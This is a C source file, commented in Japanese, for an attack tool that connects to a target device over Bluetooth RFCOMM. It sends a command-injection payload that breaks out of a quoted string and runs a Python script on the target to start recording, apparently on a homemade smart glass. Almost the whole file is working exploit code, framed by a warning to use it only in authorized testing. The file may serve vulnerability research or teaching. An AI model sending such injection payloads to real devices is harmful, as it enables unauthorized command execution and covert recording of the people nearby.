/*
 * Bluetooth Classic RFCOMM Command Injection Attack Tool
 * 
 * WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY
 * - Only use on systems you own or have explicit permission to test
 * - Unauthorized access to devices is illegal
 * - This is for vulnerability research and educational purposes
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>

#define RFCOMM_CHANNEL 1

/* Attack payload */
#define PAYLOAD "Hello\"; python3 /home/matsumoto/bt_attack/Selfmade_smartglass/Recording_app/start_rec; #"

void print_banner(void) {
    printf("--------------------------------------------------\n");
    printf("💀 Bluetooth 攻撃ツール (Command Injector) 起動\n");
    printf("--------------------------------------------------\n");
    printf("警告: このツールは承認されたテスト環境でのみ使用してください\n");
    printf("--------------------------------------------------\n");
}

void log_info(const char *format, ...) {
    va_list args;
    va_start(args, format);
    printf("[*] ");
    vprintf(format, args);
    printf("\n");
    va_end(args);
}

void log_success(const char *format, ...) {
    va_list args;
    va_start(args, format);
    printf("[+] ");
    vprintf(format, args);
    printf("\n");
    va_end(args);
}

void log_error(const char *format, ...) {
    va_list args;
    va_start(args, format);
    printf("[!] ");
    vprintf(format, args);
    printf("\n");
    va_end(args);
}

int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_rc addr = {0};
    
    print_banner();
    
    /* 引数チェック */
    if (argc != 2) {
        printf("使用方法: %s <BDアドレス>\n", argv[0]);
        printf("例: %s B8:27:EB:XX:XX:XX\n", argv[0]);
        printf("\nBDアドレスの取得方法:\n");
        printf("  被害者側で: hciconfig\n");
        return 1;
    }
    
    const char *target_bdaddr = argv[1];
    
    /* RFCOMMソケットの作成 */
    sock = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
    if (sock < 0) {
        log_error("ソケット作成エラー");
        perror("socket");
        return 1;
    }
    
    /* 接続先アドレスの設定 */
    addr.rc_family = AF_BLUETOOTH;
    addr.rc_channel = RFCOMM_CHANNEL;
    
    if (str2ba(target_bdaddr, &addr.rc_bdaddr) < 0) {
        log_error("無効なBDアドレス: %s", target_bdaddr);
        close(sock);
        return 1;
    }
    
    log_info("ターゲット %s (チャンネル %d) に接続を試行中...", 
             target_bdaddr, RFCOMM_CHANNEL);
    
    /* 接続 */
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        log_error("接続エラー");
        perror("connect");
        close(sock);
        return 1;
    }
    
    log_success("接続成功！ (Connected)");
    
    /* 攻撃ペイロードの送信 */
    log_info("悪意あるペイロードを生成中: %s", PAYLOAD);
    log_info("データを送信中 (Injecting)...");
    
    ssize_t bytes_written = write(sock, PAYLOAD, strlen(PAYLOAD));
    
    if (bytes_written < 0) {
        log_error("送信エラー");
        perror("write");
        close(sock);
        return 1;
    }
    
    log_success("送信完了！ 攻撃が実行されたはずです。");
    log_info("切断します。");
    
    /* ソケットを閉じる */
    close(sock);
    
    return 0;
}